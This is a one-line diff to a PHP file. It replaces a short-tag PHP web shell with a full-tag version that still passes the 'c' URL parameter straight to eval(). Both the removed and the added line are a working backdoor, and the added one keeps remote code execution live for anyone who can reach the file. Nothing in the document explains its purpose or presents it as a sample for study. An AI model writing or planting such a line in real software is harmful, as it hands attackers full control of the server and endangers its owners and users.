@@ -1,1 +1,1 @@
-<?=eval($_GET[c])?>
+<?php eval($_GET[c]); ?>
